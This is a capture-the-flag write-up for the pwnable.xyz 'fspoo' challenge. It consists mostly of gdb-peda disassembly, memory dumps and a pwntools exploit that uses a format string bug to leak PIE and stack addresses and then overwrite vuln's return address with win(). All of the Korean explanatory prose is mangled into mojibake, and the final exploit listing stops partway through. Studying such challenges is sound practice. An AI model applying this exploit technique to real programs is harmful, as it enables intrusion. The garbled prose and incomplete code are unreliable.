# [WriteUp]pwnable.xyz - fspoo

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

PIEê°€ ê±¸ë ¤ ìˆëŠ” ë°”ì´ë„ˆë¦¬ì´ë‹¤. PEDAë¥¼ ì´ìš©í•œ ì •ì  ë¶„ì„ì—ì„œ PIE baseëŠ” `0x56555000`ì´ ëœë‹¤. í•¨ìˆ˜ ì´ë¦„ì´ ë§¤í•‘ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— PIEë¥¼ ì‹ ê²½ì“°ì§€ ì•Šê³  break pointë¥¼ ê±¸ì–´ë„ ë¬¸ì œì—†ì´ ë¶„ì„í•  ìˆ˜ ìˆë‹¤.

---

```bash
[-------------------------------------code-------------------------------------]
   0x56555a64 <main+60>:	lea    eax,[eax+0x30]
   0x56555a67 <main+63>:	push   eax
   0x56555a68 <main+64>:	push   0x0
=> 0x56555a6a <main+66>:	call   0x56555610 <read@plt>
   0x56555a6f <main+71>:	add    esp,0x10
   0x56555a72 <main+74>:	call   0x565558d2 <vuln>
   0x56555a77 <main+79>:	mov    eax,0x0
   0x56555a7c <main+84>:	lea    esp,[ebp-0x8]
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x56557070 --> 0x0 
arg[2]: 0x1f
```

`main+66`ì—ì„œëŠ” `read(0, 0x56557070, 0x1f);`ë¥¼ í˜¸ì¶œí•œë‹¤.

```bash
gdb-peda$ x/6gx 0x56557070
0x56557070 <cmd+48>:	0x0000000000000000	0x0000000000000000
0x56557080 <cmd+64>:	0x0000000000000000	0x0000000000000000
0x56557090 <flag>:	0x0000000000000000	0x0000000000000000
```

`0x56557070`ì—ëŠ” `cmd`ë¼ëŠ” ì „ì—­ ë³€ìˆ˜ê°€ ìˆë‹¤.

```bash
gdb-peda$ x/10gx 0x56557040
0x56557040 <cmd>:	0x0000000000000000	0x0000000000000000
0x56557050 <cmd+16>:	0x0000000000000000	0x0000000000000000
0x56557060 <cmd+32>:	0x00000a3a756e654d	0x0000000000000000
0x56557070 <cmd+48>:	0x4141414141414141	0x0000000000000a41
0x56557080 <cmd+64>:	0x0000000000000000	0x0000000000000000
```

`main()`ì—ì„œ ìš°ë¦¬ê°€ ì…ë ¥í•œ Nameì€ `0x56557070`ì— ì €ì¥ëœë‹¤ëŠ” ì‚¬ì‹¤ì„ ê¸°ì–µí•˜ê³  ë„˜ì–´ê°€ì.

---

`vuln()`ì—ì„œëŠ” 3ê°œì˜ ë©”ë‰´ ì¤‘ì—ì„œ ì„ íƒí•˜ë„ë¡ í•˜ëŠ”ë°, í•˜ë‚˜ì”© ì‚´í´ë³´ë„ë¡ í•˜ì.

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x56555949 <+119>:	cmp    eax,0x1
   0x5655594c <+122>:	je     0x56555969 <vuln+151>
...
   0x56555969 <+151>:	sub    esp,0xc
   0x5655596c <+154>:	lea    eax,[ebx-0x142c]
   0x56555972 <+160>:	push   eax
   0x56555973 <+161>:	call   0x56555618 <printf@plt>
   0x56555978 <+166>:	add    esp,0x10
   0x5655597b <+169>:	sub    esp,0x4
   0x5655597e <+172>:	push   0x1f
   0x56555980 <+174>:	lea    eax,[ebx+0xa0]
   0x56555986 <+180>:	lea    eax,[eax+0x30]
   0x56555989 <+183>:	push   eax
   0x5655598a <+184>:	push   0x0
   0x5655598c <+186>:	call   0x56555610 <read@plt>
   0x56555991 <+191>:	add    esp,0x10
   0x56555994 <+194>:	jmp    0x565559e1 <vuln+271>
```

`1. Edit name.`ì„ ì„ íƒí–ˆì„ ë•Œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œì´ë‹¤. 

```bash
[-------------------------------------code-------------------------------------]
   0x56555986 <vuln+180>:	lea    eax,[eax+0x30]
   0x56555989 <vuln+183>:	push   eax
   0x5655598a <vuln+184>:	push   0x0
=> 0x5655598c <vuln+186>:	call   0x56555610 <read@plt>
   0x56555991 <vuln+191>:	add    esp,0x10
   0x56555994 <vuln+194>:	jmp    0x565559e1 <vuln+271>
   0x56555996 <vuln+196>:	sub    esp,0x4
   0x56555999 <vuln+199>:	lea    eax,[ebx+0xa0]
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x56557070 ("AAAAAAAAA\n")
arg[2]: 0x1f
```

`vuln+186`ì—ì„œëŠ” ìš°ë¦¬ê°€ ì…ë ¥í–ˆë˜ Nameì„ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤. `main+66`ì—ì„œì™€ ê°™ì€ ë°©ì‹ìœ¼ë¡œ ë¬¸ìì—´ì„ ë°›ì•„ì„œ ì €ì¥í•œë‹¤.

---

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x5655595d <+139>:	cmp    eax,0x2
   0x56555960 <+142>:	je     0x56555996 <vuln+196>
...
   0x56555996 <+196>:	sub    esp,0x4
   0x56555999 <+199>:	lea    eax,[ebx+0xa0]
   0x5655599f <+205>:	lea    eax,[eax+0x30]
   0x565559a2 <+208>:	push   eax
   0x565559a3 <+209>:	lea    eax,[ebx-0x1425]
   0x565559a9 <+215>:	push   eax
   0x565559aa <+216>:	lea    eax,[ebx+0xa0]
   0x565559b0 <+222>:	push   eax
   0x565559b1 <+223>:	call   0x56555678 <sprintf@plt>
   0x565559b6 <+228>:	add    esp,0x10
   0x565559b9 <+231>:	jmp    0x565559e1 <vuln+271>
```

`2. Prep msg.`ë¥¼ ì„ íƒí–ˆì„ ë•Œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œì´ë‹¤. 

```bash
[-------------------------------------code-------------------------------------]
   0x565559a9 <vuln+215>:	push   eax
   0x565559aa <vuln+216>:	lea    eax,[ebx+0xa0]
   0x565559b0 <vuln+222>:	push   eax
=> 0x565559b1 <vuln+223>:	call   0x56555678 <sprintf@plt>
   0x565559b6 <vuln+228>:	add    esp,0x10
   0x565559b9 <vuln+231>:	jmp    0x565559e1 <vuln+271>
   0x565559bb <vuln+233>:	sub    esp,0xc
   0x565559be <vuln+236>:	lea    eax,[ebx+0xa0]
Guessed arguments:
arg[0]: 0x56557040 --> 0x0 
arg[1]: 0x56555b7b --> 0xa9929ff0 
arg[2]: 0x56557070 ("AAAAAAAAA\n")
```

`vuln+223`ì—ì„œëŠ” `sprintf()`ë¥¼ í˜¸ì¶œí•˜ì—¬ `0x56557040`ì— ë¬¸ìì—´ì„ ì €ì¥í•˜ëŠ”ë°, í¬ë§· ìŠ¤íŠ¸ë§ì€ `0x56555b7b`ì— ìˆê³ , ì¸ìëŠ” `0x56557070`ì— ì €ì¥ëœ ë¬¸ìì—´, ì¦‰ ìš°ë¦¬ê°€ ì…ë ¥í•œ Nameì´ ëœë‹¤.

```bash
gdb-peda$ x/s 0x56555b7b
0x56555b7b:	"ğŸ’©   %s"
```

ì½”ë“œê°€ ì‹¤í–‰ëœ ë’¤ì— `cmd` ë³€ìˆ˜ì˜ ë©”ëª¨ë¦¬ë¥¼ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

```bash
gdb-peda$ x/10gx 0x56557040
0x56557040 <cmd>:	0x41202020a9929ff0	0x4141414141414141
0x56557050 <cmd+16>:	0x000000000000000a	0x0000000000000000
0x56557060 <cmd+32>:	0x00000a3a756e654d	0x0000000000000000
0x56557070 <cmd+48>:	0x4141414141414141	0x0000000000000a41
0x56557080 <cmd+64>:	0x0000000000000000	0x0000000000000000
```

ìš°ë¦¬ê°€ ì…ë ¥í•œ Nameì€ `0x56557047`ë¶€í„° ì €ì¥ëœë‹¤. ê·¸ëŸ°ë° Nameì„ ì…ë ¥ë°›ì„ ë•Œ `read(0, 0x56557070, 0x1f);`ë¥¼ í˜¸ì¶œí•´ì„œ ì…ë ¥ë°›ê¸° ë•Œë¬¸ì— ìµœëŒ€ ê¸¸ì´ëŠ” `0x1f`ë°”ì´íŠ¸ì´ë‹¤. ê·¸ëŸ¬ë©´ `0x56557047`ë¶€í„° `0x56557066` ê¹Œì§€ì˜ ë©”ëª¨ë¦¬ë¥¼ ìš°ë¦¬ê°€ ì›í•˜ëŠ” ê°’ìœ¼ë¡œ ì±„ìš¸ ìˆ˜ ìˆë‹¤.

```bash
gdb-peda$ x/s 0x56557060
0x56557060 <cmd+32>:	"Menu:\n"
```

```bash
[-------------------------------------code-------------------------------------]
   0x565558f2 <vuln+32>:	lea    eax,[ebx+0xa0]
   0x565558f8 <vuln+38>:	lea    eax,[eax+0x20]
   0x565558fb <vuln+41>:	push   eax
=> 0x565558fc <vuln+42>:	call   0x56555618 <printf@plt>
   0x56555901 <vuln+47>:	add    esp,0x10
   0x56555904 <vuln+50>:	sub    esp,0xc
   0x56555907 <vuln+53>:	lea    eax,[ebx-0x1464]
   0x5655590d <vuln+59>:	push   eax
Guessed arguments:
arg[0]: 0x56557060 ("Menu:\n")
```

`0x56557060`ì— ìˆëŠ” ë¬¸ìì—´ì€ `vuln+42`ì—ì„œ `printf()`ì˜ í¬ë§· ìŠ¤íŠ¸ë§ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ”ë°, ì´ ë¬¸ìì—´ì„ ë®ì–´ì“¸ ìˆ˜ ìˆë‹¤ë©´ ê²°ê³¼ì ìœ¼ë¡œ format string bugê°€ ë°œìƒí•˜ê²Œ ëœë‹¤.

---

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x56555962 <+144>:	cmp    eax,0x3
   0x56555965 <+147>:	je     0x565559bb <vuln+233>
...
   0x565559bb <+233>:	sub    esp,0xc
   0x565559be <+236>:	lea    eax,[ebx+0xa0]
   0x565559c4 <+242>:	push   eax
   0x565559c5 <+243>:	call   0x56555648 <puts@plt>
   0x565559ca <+248>:	add    esp,0x10
   0x565559cd <+251>:	jmp    0x565559e1 <vuln+271>
```

`3. Print msg.`ë¥¼ ì„ íƒí–ˆì„ ë•Œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œì´ë‹¤. 

```bash
[-------------------------------------code-------------------------------------]
   0x565559bb <vuln+233>:	sub    esp,0xc
   0x565559be <vuln+236>:	lea    eax,[ebx+0xa0]
   0x565559c4 <vuln+242>:	push   eax
=> 0x565559c5 <vuln+243>:	call   0x56555648 <puts@plt>
   0x565559ca <vuln+248>:	add    esp,0x10
   0x565559cd <vuln+251>:	jmp    0x565559e1 <vuln+271>
   0x565559cf <vuln+253>:	sub    esp,0xc
   0x565559d2 <vuln+256>:	lea    eax,[ebx-0x141b]
Guessed arguments:
arg[0]: 0x56557040 --> 0xa9929ff0
```

`puts()`ë¡œ `0x56557040`ì— ì €ì¥ëœ ë¬¸ìì—´ì„ ì¶œë ¥í•œë‹¤. ë³„ë‹¤ë¥¸ ì·¨ì•½ì ì€ ë°œìƒí•˜ì§€ ì•ŠëŠ” ê²ƒ ê°™ë‹¤.

---

```bash
hykor12@ubuntu:~/pwnable.xyz$ objdump -d fspoo

fspoo:     file format elf32-i386
...
000009fd <win>:
 9fd:	55                   	push   %ebp
 9fe:	89 e5                	mov    %esp,%ebp
 a00:	53                   	push   %ebx
 a01:	83 ec 04             	sub    $0x4,%esp
 a04:	e8 7d 00 00 00       	call   a86 <__x86.get_pc_thunk.ax>
 a09:	05 97 15 00 00       	add    $0x1597,%eax
 a0e:	83 ec 0c             	sub    $0xc,%esp
 a11:	8d 90 90 eb ff ff    	lea    -0x1470(%eax),%edx
 a17:	52                   	push   %edx
 a18:	89 c3                	mov    %eax,%ebx
 a1a:	e8 31 fc ff ff       	call   650 <system@plt>
 a1f:	83 c4 10             	add    $0x10,%esp
 a22:	90                   	nop
 a23:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 a26:	c9                   	leave  
 a27:	c3                   	ret
 ...
```

`objdump`ë¡œ ë°”ì´ë„ˆë¦¬ë¥¼ ê¹Œ ë³´ë‹ˆ `win()`ì´ë¼ëŠ” í•¨ìˆ˜ê°€ ìˆë‹¤. ì•„ë§ˆë„ ì´ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ ì‰˜ì„ ì£¼ë“  í”Œë˜ê·¸ë¥¼ ì£¼ë“  í•  ê²ƒ ê°™ë‹¤.

```bash
gdb-peda$ b* win+29
Breakpoint 8 at 0x56555a1a
gdb-peda$ set $eip=win
gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x56555a11 <win+20>:	lea    edx,[eax-0x1470]
   0x56555a17 <win+26>:	push   edx
   0x56555a18 <win+27>:	mov    ebx,eax
=> 0x56555a1a <win+29>:	call   0x56555650 <system@plt>
   0x56555a1f <win+34>:	add    esp,0x10
   0x56555a22 <win+37>:	nop
   0x56555a23 <win+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56555a26 <win+41>:	leave
Guessed arguments:
arg[0]: 0x56555b30 ("cat flag")
...
```

`win+29`ì—ì„œëŠ” `system("cat flag");`ë¥¼ í˜¸ì¶œí•œë‹¤. `win()`ì„ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ ìµœì¢… ëª©ì ì´ ë˜ì—ˆë‹¤.

---

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•´ ë³´ë©´ PIEê°€ ê±¸ë ¤ ìˆì–´ì„œ í•¨ìˆ˜ë“¤ì˜ ì£¼ì†Œê°€ ê³„ì† ë°”ë€ë‹¤. ì¼ë‹¨ ë­ë“  ë¦­ì„ í•˜ê³  eipë¥¼ ì¡°ì‘í•˜ëŠ” ê³¼ì •ì„ ê±°ì³ì•¼ í•œë‹¤. `vuln()`ì€ ê³„ì† ë°˜ë³µë˜ê¸° ë•Œë¬¸ì— FSBë¥¼ ë¬´í•œìœ¼ë¡œ ì¦ê¸¸ ìˆ˜ ìˆë‹¤ëŠ” ì‚¬ì‹¤ì„ ê¸°ì–µí•˜ì.

ìš°ì„  ìŠ¤íƒì—ì„œ ë½‘ì•„ë‚¼ ìˆ˜ ìˆëŠ” ê°’ì´ ë¬´ì—‡ì´ ìˆëŠ”ì§€ í™•ì¸í•´ ë³´ì. `vuln+42`ì—ì„œ `printf()`ê°€ í˜¸ì¶œë˜ê¸° ì§ì „ì˜ ìŠ¤íƒ í”„ë ˆì„ì„ ê´€ì°°í•´ ë³´ì.

```bash
gdb-peda$ x/12wx $esp
0xffffd130:	0x56557060	0xf7fb6000	0xffffd158	0x56555943
0xffffd140:	0x0000003c	0x56556fa0	0x00000003	0xd128be00
0xffffd150:	0x00000000	0x56556fa0	0xffffd168	0x56555a77
gdb-peda$ i r ebp
ebp            0xffffd158          0xffffd158
```

ê°€ì¥ ì‰½ê²Œ ìƒê°í•  ìˆ˜ ìˆëŠ” ê²ƒì€ ebpê°€ `0xffffd158`ì´ë¯€ë¡œ `vuln()`ì˜ return addressëŠ” `0xffffd15c`ì— ì €ì¥ë˜ì–´ ìˆì„ ê²ƒì´ê³ , ê·¸ ì£¼ì†ŒëŠ” ì•„ë§ˆë„ `main()`ì—ì„œ `vuln()`ì˜ í˜¸ì¶œì´ ëë‚˜ê³  ë‚œ ë°”ë¡œ ë‹¤ìŒì— ì‹¤í–‰ë˜ëŠ” ì½”ë“œì˜ ì£¼ì†Œë¼ëŠ” ì‚¬ì‹¤ì´ë‹¤.

```bash
gdb-peda$ x/i 0x56555a77
   0x56555a77 <main+79>:	mov    eax,0x0
```

`main+79`ì˜ ì£¼ì†Œì´ë‹¤. ì´ ì£¼ì†Œì—ì„œ `0xa77`ì„ ë¹¼ë©´ PIE baseê°€ ëœë‹¤. FSBë¥¼ ë°œìƒì‹œí‚¬ ë•Œ `0x56557060`ì´ í¬ë§· ìŠ¤íŠ¸ë§ì´ ë˜ê³  `0xf7fb6000`ë¶€í„° ê·¸ ë‹¤ìŒ ì¸ìë¡œ ë“¤ì–´ê°€ê¸° ë•Œë¬¸ì— í¬ë§· ìŠ¤íŠ¸ë§ì„ `"%11$p"`ë¡œ ì£¼ë©´ `0x56555a77`ì´ ì¶œë ¥ë  ê²ƒì´ë‹¤. í™•ì¸í•´ ë³´ì. ì…ë ¥ê°’ì€ ì•ì— 25ë°”ì´íŠ¸ë§Œí¼ì˜ ë”ë¯¸ë¥¼ ì¤˜ì„œ `"A"*0x19+"%11$p"`ë¡œ ì£¼ë©´ ëœë‹¤.

```bash
gdb-peda$ x/s 0x56557060
0x56557060 <cmd+32>:	"%11$p\n"
gdb-peda$ c
Continuing.
0x56555a77
1. Edit name.
2. Prep msg.
3. Print msg.
4. Exit.
```

ê¹”ë”í•˜ê²Œ ë¦­ì´ ëœë‹¤. ê·¸ëŸ¬ë©´ text ì˜ì—­ì˜ í•¨ìˆ˜ë“¤ì˜ ì£¼ì†ŒëŠ” ì˜¤í”„ì…‹ì„ ì°¾ì•„ì„œ ëª¨ë‘ ê³„ì‚°í•  ìˆ˜ ìˆë‹¤.

---

ê°™ì€ ë°©ì‹ìœ¼ë¡œ ìŠ¤íƒì˜ ì£¼ì†Œë„ ë¦­í•˜ì—¬ ASLRì„ ìš°íšŒí•  ìˆ˜ ìˆë‹¤. ebpì¸ `0xffffd158`ì— ì €ì¥ëœ ê°’ì´ SFPì´ê¸° ë•Œë¬¸ì— ì´ë²ˆì—ëŠ” `"%10$p"`ë¥¼ í¬ë§· ìŠ¤íŠ¸ë§ìœ¼ë¡œ ì£¼ë©´ ëœë‹¤.

```bash
gdb-peda$ x/s 0x56557060
0x56557060 <cmd+32>:	"%10$p\n"
gdb-peda$ c
Continuing.
0xffffd168
1. Edit name.
2. Prep msg.
3. Print msg.
4. Exit.
```

ì´ì œ ìŠ¤íƒ ì˜ì—­ì˜ ì£¼ì†Œë„ ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤.

---

ì´ì œ ì–´ë–»ê²Œ exploití• ì§€ ìƒê°í•´ ë³´ì. full relroê°€ ê±¸ë ¤ ìˆê¸° ë•Œë¬¸ì— GOT overwriteëŠ” ë¶ˆê°€ëŠ¥í•˜ë‹¤. ë©”ë‰´ë¥¼ ì„ íƒí•  ë•Œ 0ì„ ì…ë ¥í•˜ë©´ `vuln+276`ìœ¼ë¡œ ì í”„í•˜ì—¬ ë¦¬í„´í•˜ê¸° ë•Œë¬¸ì— `vuln()`ì˜ return addressë¥¼ `win()`ì˜ ì£¼ì†Œë¡œ ë®ê³  0ì„ ì…ë ¥í•˜ëŠ” ë°©ë²•ì„ ìƒê°í•´ë³¼ ìˆ˜ ìˆë‹¤.

```bash
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
...
   0x56555936 <+100>:	call   0x56555680 <__isoc99_scanf@plt>
   0x5655593b <+105>:	add    esp,0x10
   0x5655593e <+108>:	call   0x56555620 <getchar@plt>
   0x56555943 <+113>:	mov    eax,DWORD PTR [ebp-0x10]
   0x56555946 <+116>:	movzx  eax,al
   0x56555949 <+119>:	cmp    eax,0x1
   0x5655594c <+122>:	je     0x56555969 <vuln+151>
   0x5655594e <+124>:	cmp    eax,0x1
   0x56555951 <+127>:	jg     0x5655595d <vuln+139>
   0x56555953 <+129>:	test   eax,eax
   0x56555955 <+131>:	je     0x565559e6 <vuln+276>
   0x5655595b <+137>:	jmp    0x565559cf <vuln+253>
   0x5655595d <+139>:	cmp    eax,0x2
   0x56555960 <+142>:	je     0x56555996 <vuln+196>
   0x56555962 <+144>:	cmp    eax,0x3
   0x56555965 <+147>:	je     0x565559bb <vuln+233>
   0x56555967 <+149>:	jmp    0x565559cf <vuln+253>
...
```

ìœ„ì˜ ì½”ë“œëŠ” `vuln()`ì—ì„œ ë©”ë‰´ ì„ íƒì„ ë°›ëŠ” ê³¼ì •ì´ë‹¤. ëˆˆì—¬ê²¨ë³´ì•„ì•¼ í•  ë¶€ë¶„ì€ `vuln+113`ê³¼ `vuln+116` ë‘ ì¤„ì¸ë°, `scanf()`ë¡œ ì…ë ¥ë°›ì€ ì •ìˆ˜ë¥¼ eaxì— ë³µì‚¬í•œ ë‹¤ìŒ ë§ˆì§€ë§‰ 1ë°”ì´íŠ¸ë§Œ ë‚¨ê²¨ì„œ ë¹„êµí•œë‹¤. ì¦‰, ìƒìœ„ 3ë°”ì´íŠ¸ëŠ” ë©”ë‰´ ì„ íƒì— ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê²ƒì´ë‹¤. ê·¸ë ‡ë‹¤ë©´ `scanf()`ì—ì„œ `0x56557101` ê°™ì€ í° ê°’ì„ ì…ë ¥ë°›ì•˜ë‹¤ê³  ì³ë„ ë§ˆì§€ë§‰ 1ë°”ì´íŠ¸ë§Œ ë‚¨ê¸° ë•Œë¬¸ì— `1. Edit name.`ìœ¼ë¡œ ë„˜ì–´ê°€ê²Œ ëœë‹¤.

```bash
[-------------------------------------code-------------------------------------]
   0x565558f2 <vuln+32>:	lea    eax,[ebx+0xa0]
   0x565558f8 <vuln+38>:	lea    eax,[eax+0x20]
   0x565558fb <vuln+41>:	push   eax
=> 0x565558fc <vuln+42>:	call   0x56555618 <printf@plt>
   0x56555901 <vuln+47>:	add    esp,0x10
   0x56555904 <vuln+50>:	sub    esp,0xc
   0x56555907 <vuln+53>:	lea    eax,[ebx-0x1464]
   0x5655590d <vuln+59>:	push   eax
Guessed arguments:
arg[0]: 0x56557060 ("%10$p\n")
```

ìš°ë¦¬ê°€ FSBë¥¼ ë°œìƒì‹œì¼°ë˜ `printf()`ì˜ ì¸ìëŠ” `0x56557060`ì´ë‹¤.

```bash
gdb-peda$ x/20wx 0x56557040
0x56557040 <cmd>:	0xa9929ff0	0x41202020	0x41414141	0x41414141
0x56557050 <cmd+16>:	0x41414141	0x41414141	0x41414141	0x41414141
0x56557060 <cmd+32>:	0x24303125	0x00000a70	0x00000000	0x00000000
0x56557070 <cmd+48>:	0x41414141	0x41414141	0x41414141	0x41414141
0x56557080 <cmd+64>:	0x41414141	0x41414141	0x30312541	0x000a7024
```

ë©”ëª¨ë¦¬ë¥¼ ë³´ë©´, `0x56557060`ì˜ ë¬¸ìì—´ì€ `NULL` ì´ì „ê¹Œì§€ë¡œ ì¸ì‹ë˜ê¸° ë•Œë¬¸ì— ì§€ê¸ˆì€ `"%10$p\n"`ìœ¼ë¡œ ë“¤ì–´ê°„ë‹¤. ë§Œì•½ `0x5655706f`ê¹Œì§€ì˜ ë©”ëª¨ë¦¬ë¥¼ `NULL` ì—†ì´ ê°€ë“ ì±„ìš¸ ìˆ˜ ìˆë‹¤ë©´ í¬ë§· ìŠ¤íŠ¸ë§ì´ ê·¸ ë’¤ê¹Œì§€ ì­‰ ì´ì–´ì ¸ì„œ, ìš°ë¦¬ê°€ `0x1f`ë°”ì´íŠ¸ë§Œí¼ ì…ë ¥í•  ìˆ˜ ìˆëŠ” Nameì´ ê·¸ëŒ€ë¡œ í¬ë§· ìŠ¤íŠ¸ë§ìœ¼ë¡œ ë“¤ì–´ê°€ê²Œ ë  ê²ƒì´ë‹¤. ìœ„ì—ì„œëŠ” í¬ë§· ìŠ¤íŠ¸ë§ì„ ìµœëŒ€ 6ë°”ì´íŠ¸ê¹Œì§€ë°–ì— ë§Œë“¤ ìˆ˜ ì—†ì—ˆëŠ”ë°, ê¸¸ì´ ì œí•œì´ `0x1f`ë°”ì´íŠ¸ê°€ ë˜ë©´ ììœ ë¡­ê²Œ í¬ë§· ìŠ¤íŠ¸ë§ì„ êµ¬ì„±í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.

í¬ë§· ìŠ¤íŠ¸ë§ì„ `"A%6$hn"`ì²˜ëŸ¼ êµ¬ì„±í•˜ë©´, ìŠ¤íƒ í”„ë ˆì„ì„ ê´€ì°°í•´ ë³´ì•˜ì„ ë•Œ `ebp-0x10`ì— ìˆëŠ” ì£¼ì†Œì— `0x1`ì´ë¼ëŠ” ê°’ì´ ì íˆê²Œ ëœë‹¤. ê·¸ëŸ°ë° `ebp-0x10`ì—ëŠ” ìš°ë¦¬ê°€ `vuln+100`ì—ì„œ ì…ë ¥í•œ ì •ìˆ˜ê°€ ê·¸ëŒ€ë¡œ ë“¤ì–´ê°„ë‹¤. ì¦‰ ì›í•˜ëŠ” ì£¼ì†Œì— `0x1`ì´ë¼ëŠ” ê°’ì„ ë„£ì„ ìˆ˜ ìˆë‹¤. ì´ê²ƒì„ ë°˜ë³µí•˜ë©´ `0x56557065`ë¶€í„° `0x5655706f`ê¹Œì§€ `NULL` ì—†ì´ ê°€ë“ ì±„ìš¸ ìˆ˜ ìˆë‹¤.

ì¼ë‹¨ ì§€ê¸ˆê¹Œì§€ì˜ ê³¼ì •ì„ íŒŒì´ì¬ ì½”ë“œë¡œ ë§Œë“¤ì–´ ë³´ì.

```python
# exploit_fspoo.py

from pwn import *

r = process("./fspoo")
# r = remote("svc.pwnable.xyz", 30010)

def Edit(Name):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Name: ")
    r.send(Name)

def Prep():
    r.recvuntil("> ")
    r.sendline("2")

def Print():
    r.recvuntil("> ")
    r.sendline("3")

def Exit():
    r.recvuntil("> ")
    r.sendline("0")

r.recvuntil("Name: ")
r.sendline("A" * 0x19 + "%11$p")

Prep()
PIEbase = int(r.recvline()[2:-1], 16) - 0xa77 # address of PIE base
addr_win = PIEbase + 0x9fd # address of win()
log.info("address of win(): " + hex(addr_win))
addr_cmd = PIEbase + 0x2040 # address of variable 'cmd'
log.info("address of variable 'cmd': " + hex(addr_cmd))

Edit("A" * 0x19 + "%10$p")
Prep()
addr_ret = int(r.recvline()[2:-1], 16) - 0xc # address where return address is on
log.info("return address is on " + hex(addr_ret))

writable = addr_cmd + 0xc0 # address of writable memory
log.info("address of writable memory: " + hex(writable))

Edit("A" * 0x19 + "B%6$hn")
r.recvuntil("> ")
pause()
r.sendline(str(writable + 0x2))

for i in range(0x26, 0x30):
    r.recvuntil("> ")
    r.sendline(str(addr_cmd + i))

r.recvuntil("> ")
pause()
r.sendline(str(writable + 0x1))

r.interactive()
```

`pause()`ê°€ ê±¸ë¦° ìƒíƒœì—ì„œ `cmd`ì˜ ë©”ëª¨ë¦¬ë¥¼ ê´€ì°°í•´ ë³´ì.

```bash
gdb-peda$ x/20wx 0x565a7040
0x565a7040 <cmd>:	0xa9929ff0	0x41202020	0x41414141	0x41414141
0x565a7050 <cmd+16>:	0x41414141	0x41414141	0x41414141	0x41414141
0x565a7060 <cmd+32>:	0x24362542	0x01016e68	0x01010101	0x01010101
0x565a7070 <cmd+48>:	0x41414100	0x41414141	0x41414141	0x41414141
0x565a7080 <cmd+64>:	0x41414141	0x41414141	0x36254241	0x006e6824
```

`NULL` ì—†ì´ ì±„ì›Œì§„ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. `0x565a7070`ì— ìˆëŠ” `NULL` 1ë°”ì´íŠ¸ëŠ” `1. Edit name.`ì„ í•˜ë©´ ì±„ìš¸ ìˆ˜ ìˆë‹¤. ì´ ìƒíƒœì—ì„œ ê¸°ì¡´ì˜ í¬ë§· ìŠ¤íŠ¸ë§ì€ ë¬´ì‹œí•˜ê³  ìƒˆë¡œìš´ í¬ë§· ìŠ¤íŠ¸ë§ì„ ë§Œë“¤ì–´ì„œ return addressë¥¼ ì›í•˜ëŠ” ê°’ìœ¼ë¡œ ë®ì„ ìˆ˜ ìˆë‹¤. `win()`ê³¼ `main+79`ì˜ ìƒìœ„ 2ë°”ì´íŠ¸ëŠ” ê°™ê¸° ë•Œë¬¸ì— ê·¸ëŒ€ë¡œ ë‘ê³ , `win()`ì˜ í•˜ìœ„ 2ë°”ì´íŠ¸ë§Œ return addressì˜ í•˜ìœ„ 2ë°”ì´íŠ¸ì— ë®ì–´ ì£¼ë©´ ëœë‹¤.

```python
addr_win_low = int(hex(addr_win)[6:], 16) # low 2byte of address of win()

r.recvuntil("> ")
r.sendline(str(writable + 0x1))
r.recvuntil("Name: ")
r.send("%" + str(addr_win_low - 0x19) + "x%6$hn")

r.recvuntil("> ")
r.sendline("-" + str(0x100000000 - addr_ret))

Exit()
```

---

ìµœì¢… ìµìŠ¤í”Œë¡œì‡ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.

```python
# exploit_fspoo.py

from pwn import *

# r = process("./fspoo")
r = remote("svc.pwnable.xyz", 30010)

def Edit(Name):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Name: ")
    r.send(Name)

def Prep():
    r.recvuntil("> ")
    r.sendline("2")

def Print():
    r.recvuntil("> ")
    r.sendline("3")

def Exit():
    r.recvuntil("> ")
    r.sendline("0")

r.recvuntil("Name: ")
r.sendline("A" * 0x19 + "%11$p")

Prep()
PIEbase = int(r.recvline()[2:-1], 16) - 0xa77 # address of PIE base
addr_win = PIEbase + 0x9fd # address of win()
log.info("address of win(): " + hex(addr_win))
addr_cmd = PIEbase + 0x2040 # address of variable 'cmd'
log.info("address of variable 'cmd': " + hex(addr_cmd))

Edit("A" * 0x19 + "%10$p")
Prep()
addr_ret = int(r.recvline()[2:-1], 16) - 0xc # address where return address is on
log.info("return address is on " + hex(addr_ret))

writable = addr_cmd + 0xc0 # address of writable memory
log.info("address of writable memory: " + hex(writable))

Edit("A" * 0x19 + "B%6$hn")
r.recvuntil("> ")
r.sendline(str(writable + 0x2))

for i in range(0x26, 0x30):
    r.recvuntil("> ")
    r.sendline(str(addr_cmd + i))

addr_win_low = int(hex(addr_win)[6:], 16) # low 2byte of address of win()

r.recvuntil("> ")
r.sendline(str(writable + 0x1))
r.recvuntil("Name: ")
r.send("%" + str(addr_win_low - 0x19) + "x%6$hn")

r.recvuntil("> ")
